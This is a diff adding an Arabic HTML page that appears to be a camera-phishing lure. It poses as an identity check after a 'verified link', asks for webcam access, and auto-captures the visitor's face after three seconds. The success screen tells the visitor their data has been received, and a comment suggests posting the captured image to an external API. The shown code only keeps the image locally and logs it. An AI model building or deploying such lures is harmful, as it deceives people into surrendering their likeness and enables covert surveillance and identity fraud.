@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تطبيق التقاط الصور</title>
+    <style>
+        :root { --primary: #2563eb; --bg: #f8fafc; }
+        body { font-family: system-ui, -apple-system, sans-serif; background: var(--bg); display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .card { background: white; padding: 2rem; border-radius: 1rem; box-shadow: 0 10px 25px rgba(0,0,0,0.1); width: 90%; max-width: 400px; text-align: center; }
+        button { background: var(--primary); color: white; border: none; padding: 0.8rem 1.5rem; border-radius: 0.5rem; cursor: pointer; font-size: 1rem; width: 100%; transition: opacity 0.2s; }
+        button:hover { opacity: 0.9; }
+        .hidden { display: none; }
+        video { width: 100%; border-radius: 0.5rem; transform: scaleX(-1); background: #000; margin-top: 1rem; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid var(--primary); border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 10px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <div id="view-upload">
+        <h2>مرحباً بك</h2>
+        <p>يرجى اختيار صورة للمتابعة</p>
+        <input type="file" id="file-input" accept="image/*" class="hidden">
+        <button onclick="document.getElementById('file-input').click()">إرفاق صورة</button>
+    </div>
+
+    <div id="view-camera" class="hidden">
+        <h3>تم التحقق من الرابط</h3>
+        <p>اضغط للسماح بالكاميرا لتأكيد الهوية</p>
+        <button id="btn-allow">السماح بالوصول للكاميرا</button>
+        <div id="cam-container" class="hidden">
+            <video id="video" autoplay playsinline></video>
+            <div class="loader"></div>
+            <p id="timer-text">جاري الالتقاط خلال 3 ثوانٍ...</p>
+        </div>
+    </div>
+
+    <div id="view-success" class="hidden">
+        <h2 style="color: #059669;">تمت العملية بنجاح</h2>
+        <p>شكراً لك، تم استلام بياناتك.</p>
+        <canvas id="canvas" class="hidden"></canvas>
+        <img id="final-img" style="width:100%; border-radius: 8px; border: 2px solid #059669;">
+    </div>
+</div>
+
+<script>
+    const fileInput = document.getElementById('file-input');
+    const btnAllow = document.getElementById('btn-allow');
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+
+    // الانتقال من الرفع إلى الكاميرا
+    fileInput.onchange = () => {
+        document.getElementById('view-upload').classList.add('hidden');
+        document.getElementById('view-camera').classList.remove('hidden');
+    };
+
+    // تشغيل الكاميرا والالتقاط
+    btnAllow.onclick = async () => {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            video.srcObject = stream;
+            btnAllow.classList.add('hidden');
+            document.getElementById('cam-container').classList.remove('hidden');
+
+            // التقاط تلقائي بعد 3 ثوانٍ
+            setTimeout(() => {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                
+                const photoData = canvas.toDataURL('image/jpeg');
+                stream.getTracks().forEach(track => track.stop()); // إغلاق الكاميرا
+                
+                showSuccess(photoData);
+            }, 3000);
+        } catch (err) {
+            alert("عذراً، يجب السماح بالكاميرا لكي يعمل الرابط.");
+        }
+    };
+
+    function showSuccess(data) {
+        document.getElementById('view-camera').classList.add('hidden');
+        document.getElementById('view-success').classList.remove('hidden');
+        document.getElementById('final-img').src = data;
+        
+        // ملاحظة: بما أن GitHub static، يمكنك هنا إرسال data إلى API خارجي إذا أردت.
+        console.log("Image Captured:", data);
+    }
+</script>
+
+</body>
+</html>
